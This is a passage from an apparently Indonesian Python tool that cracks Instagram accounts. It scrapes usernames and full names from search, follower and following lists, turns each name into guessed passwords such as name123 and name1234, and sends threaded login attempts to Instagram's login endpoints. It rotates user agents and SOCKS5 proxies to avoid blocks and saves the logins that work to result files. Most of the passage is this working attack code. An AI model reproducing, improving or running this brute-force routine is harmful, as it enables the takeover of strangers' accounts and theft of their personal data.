			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''

class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
		self.tol = Console()
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			banner()
			self.mentod()
			tap = me()
			tap.add_column('NO', style='', justify='center')
			tap.add_column('MENU', style='', justify='left', width=55)
			tap.add_column('STATUS', style='green', justify='right')
			tap.add_row('[01]','Crack Dari Pencarian Nama				 	','[ON]')
			tap.add_row('[02]','Crack Dari Pengikut',					'[ON]')
			tap.add_row('[03]','Crack Dari Mengikuti			',					'[ON]')
			tap.add_row('[04]','Crack Ulang Hasil [yellow]CP[/yellow]					','[ON]')
			tap.add_row('[05]','Lihat Hasil Crack					','[ON]')
			tap.add_row('[06]','Bot auto unfollow','[red][OFF][/red]')
			tap.add_row('[E]','[red]LOGOUT[/red]','[ON]')
			sol().print(tap, justify='green')
	def mentod(self):
		for i in external:
			nama=i.split('|')[0]
			followers=i.split('|')[1]
			following=i.split('|')[2]
			ses=requests.Session()
			try:
				device = platform()
				lisen=open('.lisen.txt').read()
				met = ses.get("https://instagram.fulldxrmedia.xyz/check.php?key=%s&dev=%s" % (lisen, device)).json()
				#men = met['licenseKey']
				join = met["join"]
				kadaluarsa = met["expired"]
				nama1=met["nama"]
				email=met["email"]
				urut = []
				urut.append(Panel(f"Nama     : {nama}		\nUsername : {self.username} 		\nPengikut : {followers} 					\nMengikuti: {following}		",title=f'DATA AKUN',padding=(0,2), style="white"))
				urut.append(Panel(f"Nama : {nama1}\nEmail : {email}\nBergabung : {join}\nKadaluarsa : {kadaluarsa}",title=f'LISENSI',padding=(0,2), style="white"))
				self.tol.print(Columns(urut))
			except:
				tanggal = "-"
				bulan = "-"
				tahun = "-"
				tanggal1 = "-"
				bulan1 = "-"
				tahun1 = "-"
				nama1="-"
				email="-"
				urut=[]
				urut.append(Panel(f"{C}Nama     : {nama}		\n{C}Username : {self.username} 		\n{C}Pengikut : {followers} 					\n{C}Mengikuti: {following}		",title=f'DATA AKUN',padding=(0,2), style="white"))
				urut.append(Panel(f"Nama : {nama1}\nEmail : {email}\nBergabung : {tanggal1} {bulan1} {tahun1}\n{C}Kadaluarsa : {tanggal} {bulan} {tahun}",title=f'LISENSI',padding=(0,2), style="white"))
				self.tol.print(Columns(urut))

	def BUG(self):
		bug=f'[•] Bantu saya mengembangkan script ini. apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.\n[•] Anda bisa melaporkan langsung ke wa admin +6283114591358\n[•]'
		bug1 = nel(bug, style='cyan')
		cetak(nel(bug1, title='REPORT BUG'))
		exit()

	def ChangeLog(self):
		io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur yang di update'))

		io='[1] Bot unfollow instagram\n[2] Bot spam komen'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur tambahan'))

		io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fix Bug'))
		exit()

	def Exit(self):
		kel='[?] Apakah anda yakin ingin keluar ?'
		kel1=nel(kel,style='red')
		sol().print(kel1)
		x=input(f'\n{N}[•] Jawaban [y/t] : {C}')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			os.system('python run.py')
		elif x in ('t','T'):
			os.system('python run.py')
		else:
			self.Exit()

	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=generateUUID(True)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})

		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


	def searchAPI(self,cookie,nama):
		try:
			for ba in range(100):
				x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						user=i['user']
						username=user['username']
						fullname=user['full_name']
						internal.append(f'{username}|{fullname}')
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
		except Exception as e:print(e)
		return internal
	def ua_ig(self):
		rr = random.randint
		return (f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}.{str(rr(7,12))}; Redmi Note {str(rr(7,12))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80,105))}.0.{str(rr(1111,4444))}.{str(rr(111,400))} Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)")
	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
			except Exception as e:
				exit(f"\n{M}┣[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
			return idx
		else:lisensi()
    	
	def infoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				exit(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
			except Exception as e:
				print(f'\n{M}┣[!] Username yang anda masukan tidak di temukan{N}')
			return internal
		else:lisensi()
		
	def ifoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				exit(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
			except Exception as e:
				print(f'\n{M}┣[!] Username yang anda masukan tidak di temukan{N}')
			return internal
		else:lisensi()

	def inngfo(self, coki):
		try:
			link = s.get(f"https://i.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":USN},cookies={"cookie":coki}).json()["form_data"]
			nomo = link["phone_number"].replace("-", "").replace(" ", "")
			tggl = link["birthday"]
			year, month, day = tggl.split("-")
			month = bulan_ttl[month]
			tanggal = (f"{day} {month} {year}")
			email = link["email"]
		except:
			nomo = "-"
			tanggal = "-"
			email = "-"
		return nomo, tanggal, email
	def tahun(self,coki):
		ses=requests.Session()
		try:
			b = ses.get("https://www.instagram.com/accounts/access_tool/", cookies={"cookie":coki})
			soup = parser(b.text,'html.parser')
			body = soup.find("body")
			script = body.find("script", text=lambda t: t.startswith("window._sharedData"))
			script_json = script.string.split(" = ", 1)[1].rstrip(";")
			script_json = json.loads(script_json)
			i = script_json["entry_data"]['SettingsPages']
			regax = re.findall('\d+',str(i))
			thn = datetime.fromtimestamp(int(regax[0])).strftime('%d %B %Y')
		except:
			thn = "-"
		return thn
	def ingfo(self):
		urut = []
		prints(Panel(f"[{bc}!{hapus}] Hasil crack akan di simpan di dalam folder results", padding=(0,4),style=""))
		urut.append(Panel(f"result/[bold green]OK-{day}.txt[/]",padding=(0,4),style=""))
		urut.append(Panel(f"result/[bold yellow]CP-{day}.txt[/]",padding=(0,4),style=""))
		self.tol.print(Columns(urut))

	def ifo(self):
		urut = []
		prints(Panel(f" [{bc}+{hapus}] Pilih methode",style=""))
		urut.append(Panel(f"[01] Methode API",padding=(0,7),style=""))
		urut.append(Panel(f"[02] Methode API V2",padding=(0,7),style=""))
		urut.append(Panel(f"[03] Methode AJAX",padding=(0,7),style=""))
		self.tol.print(Columns(urut))

	def passwordAPI(self,xnx):
		idtar=f' [•] TOTAL ID  : [cyan]{len(internal)} [/cyan]'
		idtar1=nel(idtar,style='')
		sol().print(idtar1)
		self.ifo()
		u = input(f'[•] Pilih methode : ')
		if u in ["1","01"]:
			method.append('satu')
		elif u in ["2","02"]:
			method.append('dua')
		elif u in ["3", "03"]:
			method.append('tiga')
		else:
			method.append('satu')
		komb=nel('[1] Name,Name123,Name1234\n[2] Name,Name123,Name1234,Name12345\n[3] Name,Name123,Name1234,Name12345,Name123456\n[4] Name,Name123,Name1234 + Password Manual',style='')
		prints(nel(komb,title='[cyan]List Password[/cyan]'))
		c=input(f'{N}[•] Masukan Pilihan :{C} ')
		if c in ["01","1"]:
			self.generateAPI(xnx,c)
		elif c in ["2","02"]:
			self.generateAPI(xnx,c)
		elif c in ["3","03"]:
			self.generateAPI(xnx,c)
		elif c in ["4","04"]:
			prints(Panel(f"{P2}contoh password : sayang,anjing,bangsat",width=80,padding=(0,4),style=""))
			zx=input(f'{N}[•] Tambahkan password :{N} ')
			self.generateAPI(xnx,c,zx)
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o,zx=''):
		self.ingfo()
		with ThreadPoolExecutor(max_workers=15) as shinkai:
			for i in user:
				try:
					username=i.split("|")[0]
					password=i.split("|")[1].lower()
					for w in password.split(" "):
						if len(w)<3:
							continue
						else:
							w=w.lower()
							if o=="1":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234']
								else:
									sandi=[w,w+'123',w+'1234']
							elif o=="2":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234',password.lower()]
								else:
									sandi=[w+'123',w,w+'1234',password.lower()]
							elif o=="3":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
								else:
									sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
							elif o=="4":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi = zx.replace(" ", "").split(",")
								else:
									sandi = zx.replace(" ", "").split(",")
							if 'satu' in method:
								shinkai.submit(self.crackAPI,username,sandi)
							elif 'dua' in method:
								shinkai.submit(self.CrackAPIv2,username,sandi)
							elif 'tiga' in method:
								shinkai.submit(self.crackerAPI,username,sandi)
							else:
								shinkai.submit(self.crackAPI,username,sandi)
				except:
					pass
		print('\n')
		prints(Panel(f"{P2}[{H2}✓{P2}] crack akun selesai",width=80,padding=(0,4),style=f"{color_table}"));time.sleep(3)
		exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = "-"
			pengikut = "-"
			mengikut = "-"
			postingan = "-"

		return nama,pengikut,mengikut,postingan

	def CrackAPIv2(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		sys.stdout.write(f"\r{CY}[CRACK] [{K}{loop}/{len(internal)}{C}] {H} OK : - {len(success)}{C}  {K} CP : - {len(checkpoint)} {N}\r"),sys.stdout.flush()
		try:
			for pw in pas:
				ncek=random.randint(100000000000, 9999999999999)
				ts=calendar.timegm(current_GMT)
				nip=random.choice(proxy)
				proxs={'http': 'socks5://'+nip}
				p=ses.get('https://www.instagram.com/web/__mid')
				aa1='Mozilla/5.0 (Linux; Android'
				b1=random.choice(['4','5','6','7','8','9','10','11','12'])
				c1='BRAVIA 2K GB ATV3)'
				g1='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				h1=random.randrange(73,100)
				i1='0'
				j1=random.randrange(4200,4900)
				k1=random.randrange(40,150)
				l1='Mobile Safari/537.36'
				uasu=f"{aa1} {b1}; {c1} {g1}{h1}.{i1}.{j1}.{k1} {l1}"
				aa3='Mozilla/5.0 (Linux; Android'
				b3=random.choice(['4','5','6','7','8','9','10','11','12'])
				c3='vivo 1606 Build/MMB29M; wv)'
				g3='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				h3=random.randrange(73,100)
				i3='0'
				j3=random.randrange(4200,4900)
				k3=random.randrange(40,150)
				l3='Mobile Safari/537.36 VivoBrowser/6.8.0.1'
				uasu3=f"{aa3} {b3}; {c3} {g3}{h3}.{i3}.{j3}.{k3} {l3}"
				aa5='Mozilla/5.0 (Linux; Android'
				b5=random.choice(['4','5','6','7','8','9','10','11','12'])
				c5='HTC Build/OPM2.171019.012; wv)'
				g5='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
				h5=random.randrange(73,100)
				i5='0'
				j5=random.randrange(4200,4900)
				k5=random.randrange(40,150)
				l5='Mobile Safari/537.36'
				uasu5=f"{aa5} {b5}; {c5} {g5}{h5}.{i5}.{j5}.{k5} {l5}"
				iky_gas=[uasu,uasu3,uasu5]
				iky_ua=random.choice(iky_gas)
				headers={
				'Host': 'i.instagram.com',
				'content-length': '355',
				'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
				'x-ig-app-id': '1217981644879628',
				'x-ig-www-claim': '0',
				'sec-ch-ua-mobile': '?1',
				'x-instagram-ajax': '1006744097',
                'user-agent': iky_ua,
				'x-csrftoken': p.cookies['csrftoken'],
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
				data={
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(100000000000, 9999999999999),pw),
		   			"username": user,
					"queryParams": {},
					"optIntoOneTap": False,
					"trustedDeviceRecords": {}}
				respon=ses.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, proxies=proxs)
				iky=json.loads(respon.text)
				if 'userId' in str(iky):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					io=f"""{crot}[white] Nama : [green]{nama}
{crot}[white] Username : [green]{user}
{crot}[white] Password : [green]{pw}
{crot}[white] Followers : [green]{pengikut}
{crot}[white] Following : [green]{mengikut}
{crot}[white] Postingan : [green]{postingan}"""
					prints(nel(io,title='[green]LIVE[white]',style='white',width=80,padding=(0,8)))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'checkpoint_url' in str(iky):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					io=f"""{crit}[white] Nama : [yellow]{nama}
{crit}[white] Username : [yellow]{user}
{crit}[white] Password : [yellow]{pw}
{crit}[white] Followers : [yellow]{pengikut}
{crit}[white] Following : [yellow]{mengikut}
{crit}[white] Postingan : [yellow]{postingan}"""
					prints(nel(io,title='[yellow]CHECKPOINT[white]', style='white',width=80,padding=(0,8)))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'spam' in str(respon.text):
					sys.stdout.write(f"\r[!] {M}IP DI BLOKIR ON OFF MODE PESAWAT!!                 ");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
				elif 'Please wait a few minutes' in str(respon.text):
					sys.stdout.write(f"\r[!] {M}IP DI BLOKIR ON OFF MODE PESAWAT!!                 ");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f"\r[!] {M}IP DI BLOKIR ON OFF MODE PESAWAT!!                 ");sys.stdout.flush();sleep(0)
					self.crackAPI(user,pas)

				else:
					continue

			loop+=1
		except:
			self.CrackAPIv2(user,pas)

	
	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ugenter=open('.user-agent.txt','r').read().splitlines()
		ua=random.choice(baru)
		sys.stdout.write(f"\r{CY}[CRACK] [{K}{loop}/{len(internal)}{C}] {H} OK : - {len(success)}{C}  {K} CP : - {len(checkpoint)} {N}\r"),sys.stdout.flush()
		try:
			for pw in pas:
				ncek=random.randint(100000000000, 9999999999999)
				ts = calendar.timegm(current_GMT)
				nip=random.choice(proxy)
				proxs= {'http': 'socks5://'+nip}
				p = ses.get('https://www.instagram.com/web/__mid')
				aa1='Mozilla/5.0 (Linux; Android'
				b1=random.choice(['4','5','6','7','8','9','10','11','12'])
				c1='BRAVIA 2K GB ATV3)'
				g1='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				h1=random.randrange(73,100)
				i1='0'
				j1=random.randrange(4200,4900)
				k1=random.randrange(40,150)
				l1='Mobile Safari/537.36'
				uasu=f"{aa1} {b1}; {c1} {g1}{h1}.{i1}.{j1}.{k1} {l1}"
				aa3='Mozilla/5.0 (Linux; Android'
				b3=random.choice(['4','5','6','7','8','9','10','11','12'])
				c3='vivo 1606 Build/MMB29M; wv)'
				g3='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				h3=random.randrange(73,100)
				i3='0'
				j3=random.randrange(4200,4900)
				k3=random.randrange(40,150)
				l3='Mobile Safari/537.36 VivoBrowser/6.8.0.1'
				uasu3=f"{aa3} {b3}; {c3} {g3}{h3}.{i3}.{j3}.{k3} {l3}"
				aa5='Mozilla/5.0 (Linux; Android'
				b5=random.choice(['4','5','6','7','8','9','10','11','12'])
				c5='V2038 Build/SP1A.210812.003; wv)'
				g5='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
				h5=random.randrange(73,100)
				i5='0'
				j5=random.randrange(4200,4900)
				k5=random.randrange(40,150)
				l5='Mobile Safari/537.36'
				uasu5=f"{aa5} {b5}; {c5} {g5}{h5}.{i5}.{j5}.{k5} {l5}"
				iky_gas=[uasu,uasu3,uasu5]
				iky_ua=random.choice(iky_gas)
				headers={
				'Host': 'www.instagram.com',
				'content-length': '355',
				'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
				'x-ig-app-id': '1217981644879628',
				'x-ig-www-claim': '0',
				'sec-ch-ua-mobile': '?1',
				'x-instagram-ajax': '1006744097',
                'user-agent': iky_ua,
				'x-csrftoken': p.cookies['csrftoken'],
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
				data = {
           "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(100000000000, 9999999999999),pw),
		   "username": user,
			"queryParams": {},
			"optIntoOneTap": False,
			"trustedDeviceRecords": {}}
				respon=ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers = headers, data = data, proxies = proxs,  allow_redirects=True)
				iky=json.loads(respon.text)
				if 'userId' in str(iky):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					io=f"""{crot}[white] Nama : [green]{nama}
{crot}[white] Username : [green]{user}
{crot}[white] Password : [green]{pw}
{crot}[white] Followers : [green]{pengikut}
{crot}[white] Following : [green]{mengikut}
{crot}[white] Postingan : [green]{postingan}"""
					prints(nel(io,title='[green]LIVE[white]',width=80,padding=(0,8),style='white'))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'checkpoint_url' in str(iky):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					io=f"""{crit}[white] Nama : [yellow]{nama}
{crit}[white] Username : [yellow]{user}
{crit}[white] Password : [yellow]{pw}
{crit}[white] Followers : [yellow]{pengikut}
{crit}[white] Following : [yellow]{mengikut}
{crit}[white] Postingan : [yellow]{postingan}"""
					prints(nel(io,title='[yellow]CHECKPOINT[white]',width=80,padding=(0,8),style='white'))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'spam' in str(respon.text):
					sys.stdout.write(f"\r[!] {M}IP DI BLOKIR ON OFF MODE PESAWAT!!                 ");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
				elif 'Please wait a few minutes' in str(respon.text):
					sys.stdout.write(f"\r[!] {M}IP DI BLOKIR ON OFF MODE PESAWAT!!                 ");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f"\r[!] {M}IP DI BLOKIR ON OFF MODE PESAWAT!!                 ");sys.stdout.flush();sleep(0)
					self.crackAPI(user,pas)

				else:
					continue

			loop+=1
		except:
			self.crackAPI(user,pas)



	def crackerAPI(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua=random.choice(baru)
		warna = random.choice([M, H, K, U, O,])
		sys.stdout.write(f"\r{CY}[CRACK] [{K}{loop}/{len(internal)}{C}] {H} OK : - {len(success)}{C}  {K} CP : - {len(checkpoint)}{N}\r"),sys.stdout.flush()
		try:
			for pw in pas:
				aa1='Mozilla/5.0 (Linux; Android'
				b1=random.choice(['4','5','6','7','8','9','10','11','12'])
				c1='BRAVIA 2K GB ATV3)'
				g1='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				h1=random.randrange(73,100)
				i1='0'
				j1=random.randrange(4200,4900)
				k1=random.randrange(40,150)
				l1='Mobile Safari/537.36'
				uasu=f"{aa1} {b1}; {c1} {g1}{h1}.{i1}.{j1}.{k1} {l1}"
				aa3='Mozilla/5.0 (Linux; Android'
				b3=random.choice(['4','5','6','7','8','9','10','11','12'])
				c3='vivo 1606 Build/MMB29M; wv)'
				g3='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				h3=random.randrange(73,100)
				i3='0'
				j3=random.randrange(4200,4900)
				k3=random.randrange(40,150)
				l3='Mobile Safari/537.36 VivoBrowser/6.8.0.1'
				uasu3=f"{aa3} {b3}; {c3} {g3}{h3}.{i3}.{j3}.{k3} {l3}"
				aa5='Mozilla/5.0 (Linux; Android'
				b5=random.choice(['4','5','6','7','8','9','10','11','12'])
				c5='V2038 Build/SP1A.210812.003; wv)'
				g5='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
				h5=random.randrange(73,100)
				i5='0'
				j5=random.randrange(4200,4900)
				k5=random.randrange(40,150)
				l5='Mobile Safari/537.36'
				uasu5=f"{aa5} {b5}; {c5} {g5}{h5}.{i5}.{j5}.{k5} {l5}"
				iky_gas=[uasu,uasu3,uasu5]
				iky_ua=random.choice(iky_gas)
				ncek=random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				nip=random.choice(proxy)
				proxs= {'http': 'socks5://'+nip}
				token=s.get('https://www.instagram.com/web/__mid')
				headers = {
					'Host': 'z-p42.www.instagram.com',
                    'x-ig-www-claim': 'hmac.AR3F8pNjlTzH4yNJlnWGvQs0l9MDR0UyTUD17bIWL8Cr_pyS',
					'x-instagram-ajax': 'e8a3554562db',
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*',
					'x-requested-with': 'XMLHttpRequest',
					'x-asbd-id': '198387',
					'user-agent': iky_ua,
					'x-csrftoken': token.cookies['csrftoken'],
					'x-ig-app-id': '936619743392459',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                }
				param={
                    "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                    "username": user,
                    "optIntoOneTap": False,
                    "queryParams": {},
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": {}}
				respon=ses.post("https://z-p42.www.instagram.com/accounts/login/ajax/", headers=headers, data=param, proxies=proxs)
				iky=json.loads(respon.text)
				if 'userId' in str(iky):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					io=f"""{crot}[white] Nama : [green]{nama}
{crot}[white] Username : [green]{user}
{crot}[white] Password : [green]{pw}
{crot}[white] Followers : [green]{pengikut}
{crot}[white] Following : [green]{mengikut}
{crot}[white] Postingan : [green]{postingan}"""
					prints(nel(io,title='[green]LIVE[white]',width=80,padding=(0,8),style='white'))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'checkpoint_url' in str(iky):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					io=f"""{crit}[white] Nama : [yellow]{nama}
{crit}[white] Username : [yellow]{user}
{crit}[white] Password : [yellow]{pw}
{crit}[white] Followers : [yellow]{pengikut}
{crit}[white] Following : [yellow]{mengikut}
{crit}[white] Postingan : [yellow]{postingan}"""
					prints(nel(io,title='[yellow]CHECKPOINT[white]',width=80,padding=(0,8), style='white'))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'spam' in str(respon.text):
					sys.stdout.write(f"\r[!] {M}IP DI BLOKIR ON OFF MODE PESAWAT!!                 ");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
				elif 'Please wait a few minutes' in str(respon.text):
					sys.stdout.write(f"\r[!] {M}IP DI BLOKIR ON OFF MODE PESAWAT!!                 ");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f"\r[!] {M}IP DI BLOKIR ON OFF MODE PESAWAT!!                 ");sys.stdout.flush();sleep(0)
					self.crackAPI(user,pas)

				else:
					continue

			loop+=1
		except requests.exceptions.ConnectionError:
			time.sleep(10)
			self.crackerAPI(user,pas)
	def checkAPI(self,user,pwd):
		try:
			ts = calendar.timegm(current_GMT)
			nip=random.choice(proxy)
			proxs= {'http': 'socks5://'+nip}
			ncek=random.randint(1000000000, 99999999999)
			aa='Mozilla/5.0 (HuaweiBrowser/11.1.3.300 '
			b=random.choice(['4','5','6','7','8','9','10','11','12'])
			c='HarmonyOS; JKM-AL00b; HMSCore 6.4.0.311'
			d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
			e=random.randrange(1, 999)
			f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
			g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 HuaweiBrowser/11.1.3.300'
			h=random.randrange(73,100)
			i='0'
